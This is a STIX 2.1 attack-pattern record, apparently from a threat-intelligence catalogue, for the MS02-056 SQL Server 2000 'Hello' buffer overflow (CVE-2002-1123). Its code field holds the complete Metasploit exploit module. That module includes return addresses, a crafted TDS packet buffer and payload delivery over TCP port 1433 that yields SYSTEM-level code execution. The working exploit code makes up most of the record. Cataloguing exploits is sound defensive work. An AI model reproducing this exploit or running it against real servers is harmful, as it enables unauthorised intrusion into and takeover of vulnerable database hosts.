{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea3ae2a7-a7da-4b8e-b92e-1063db81d08e",
    "created": "2024-08-14T16:39:47.54584Z",
    "modified": "2024-08-14T16:39:47.545844Z",
    "name": "MS02-056 Microsoft SQL Server Hello Overflow",
    "description": " By sending malformed data to TCP port 1433, an unauthenticated remote attacker could overflow a buffer and possibly execute code on the server with SYSTEM level privileges. This module should work against any vulnerable SQL Server 2000 or MSDE install (< SP3).  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mssql/ms02_056_hello.rb",
            "external_id": "ms02_056_hello.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-1123"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::MSSQL\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS02-056 Microsoft SQL Server Hello Overflow',\n      'Description'    => %q{\n          By sending malformed data to TCP port 1433, an\n        unauthenticated remote attacker could overflow a buffer and\n        possibly execute code on the server with SYSTEM level\n        privileges. This module should work against any vulnerable\n        SQL Server 2000 or MSDE install (< SP3).\n\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2002-1123'],\n          [ 'OSVDB', '10132'],\n          [ 'BID', '5411'],\n          [ 'MSB', 'MS02-056'],\n\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Targets'        =>\n        [\n          [\n            'MSSQL 2000 / MSDE <= SP2',\n            {\n              'Platform' => 'win',\n              'Rets'     => [0x42b68aba, 0x42d01e50],\n            },\n          ],\n        ],\n      'Platform'       => 'win',\n      'DisclosureDate' => '2002-08-05',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    info = mssql_ping\n    if (info['ServerName'])\n      print_status(\"SQL Server Information:\")\n      info.each_pair { |k,v|\n        print_status(\"   #{k + (\" \" * (15-k.length))} = #{v}\")\n      }\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n    buf = \"\\x12\\x01\\x00\\x34\\x00\\x00\\x00\\x00\\x00\\x00\\x15\\x00\\x06\\x01\\x00\\x1b\" +\n      \"\\x00\\x01\\x02\\x00\\x1c\\x00\\x0c\\x03\\x00\\x28\\x00\\x04\\xff\\x08\\x00\\x02\" +\n      \"\\x10\\x00\\x00\\x00\" +\n      rand_text_english(528, payload_badchars) +\n      \"\\x1B\\xA5\\xEE\\x34\" +\n      rand_text_english(4, payload_badchars) +\n      [ target['Rets'][0] ].pack('V') +\n      [ target['Rets'][1], target['Rets'][1] ].pack('VV') +\n      '3333' +\n      [ target['Rets'][1], target['Rets'][1] ].pack('VV') +\n      rand_text_english(88, payload_badchars) +\n      payload.encoded +\n      \"\\x00\\x24\\x01\\x00\\x00\"\n\n    sock.put(buf)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-08-05",
    "x_mitre_platforms": [
        "win'"
    ]
}